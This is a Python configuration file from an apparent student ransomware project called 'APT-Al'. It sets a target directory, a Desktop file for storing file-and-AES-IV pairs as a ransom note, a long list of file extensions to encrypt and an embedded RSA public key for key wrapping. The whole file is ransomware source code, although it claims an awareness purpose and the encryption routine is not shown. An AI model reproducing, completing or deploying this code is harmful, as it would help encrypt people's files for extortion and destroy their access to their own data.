import os
from datetime import datetime

who_we_are = "APT-Al"
version = "v1.1"
what_is_my_purpose = """Hi there,
we are a group of university students from Hacettepe.
We aim that the main reason for starting the project is increasing awareness of cybersecurity by informing people."""

what_is_my_name = "zararliyim.exe"
what_is_my_id = "1"# ransomwareID
when_did_i_work = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

# the beginning point of recon
root_directory = os.path.expanduser('~')
desktop_directory = os.path.join(root_directory,"Desktop")
root_directory = os.path.join(root_directory,"test")

# if this file have been created, we're going to create a new one not to ruin old keys
aesIV_file_store_name = "HEYY_APTAl_READ_ME.txt"
_len_aesIV_file_store_name = len(aesIV_file_store_name)
_count_of_file = 0
for name in os.listdir(desktop_directory):
    if name[-_len_aesIV_file_store_name:] == aesIV_file_store_name:
        _count_of_file += 1
# where to write the pairs made up of a file and AES IV
aesIV_file_store_path = os.path.join(desktop_directory,str(_count_of_file)+aesIV_file_store_name)

# the extensions are ordered so we can use binary search
file_extentions = [ '7z', 'ai', 'aif', 'apk', 'arj', 'asp', 'aspx', 'avi', 
                    'bak', 'bat', 'bin', 'bmp', 'c', 'cab', 'cda', 'cfg', 
                    'cgi', 'class', 'cpp', 'cs', 'css', 'csv', 'dat', 'db', 
                    'dbf', 'deb', 'dmg', 'doc', 'docx', 'eml', 'fnt', 
                    'fon', 'htm', 'html', 'ico', 'iso', 'jar', 'java', 'jpeg', 
                    'jpg', 'js', 'json', 'jsp', 'key', 'log', 'mdb', 'mid', 'midi', 
                    'mov', 'mp3', 'mp4', 'mpa', 'mpg', 'msg', 'msi', 'odp', 
                    'ods', 'oft', 'ogg', 'ost', 'pdf', 'php', 'pkg', 'pl', 
                    'png', 'pps', 'ppt', 'pptx', 'py', 'rar', 'rpm', 'rss', 
                    'rtf', 'sh', 'sql', 'svg', 'swift', 'sys', 'tar', 'tif', 
                    'tiff', 'toast', 'txt','vb', 'wav', 'wma', 'wpl', 'wsf', 
                    'xhtml', 'xls', 'xml', 'xslm', 'xslx', 'zip']
# exe deleted

aes_IV_key_length = 16
rsa_public_key = "-----BEGIN RSA PUBLIC KEY-----\n\
MIICCgKCAgEAu25ITaLSaYnlJ88w8nWdoJF/q4nrtqH9Iajw1CWlEiSTlUqMy0x+\n\
3uDC29Afv246gSad+fXvS0V22mhnv9ByVk8mTBQCCx7ytR0wLGGSkYl1eSsPAmvV\n\
g59onZgM/aF0vr4MCmYZLqXOabWF6/a8/+qW/v2vA3DJ6ur4N3GEAC26c40YoXqU\n\
nt3Eazzfe5rXMrXPokxaBqfQfzCPVAwwWuTL4VDQINm47cLK4c5RmagQXm3ZvqBg\n\
8j2RMAKZ7xvzw9OCacTEahypcMyyobWSiAsrhNHBl3GsKAne/91LYDmWJUa5tg7q\n\
FBT2M1RvNGezBdV0jDWbUy4KFBS2pr02PWhACLGXZzqAI2isq6fjCJv8tQB7+MWx\n\
fncrreeNQGJ9JqErAZ7IlwlW+NAbn/RQ4OuRLGCIL2IDTkeBN9GKiIqvxOkvtvjR\n\
QKpPHa5tDgMWgmYTsIZrPFUCjbBslQQuYMPLx66rBAr7bNEJZoG4xaAsWHBbvj2r\n\
b4DvLhmsrITAppF9TATh1amnze+Gbupxm68hn+XTecyWFsXz7kIfsycT/OmwW2vm\n\
hjPH7H5Q4TqpxEkDDc3thRcr47wZtiYGeanc/UOsNabxyTahKGPFYooVHaoj9pl5\n\
s+osKiL/Se+8eKHxt9JgP1tUXYMZbfNoo0q0QkIfl3Q8Js+lsOqVP+cCAwEAAQ==\n\
-----END RSA PUBLIC KEY-----"
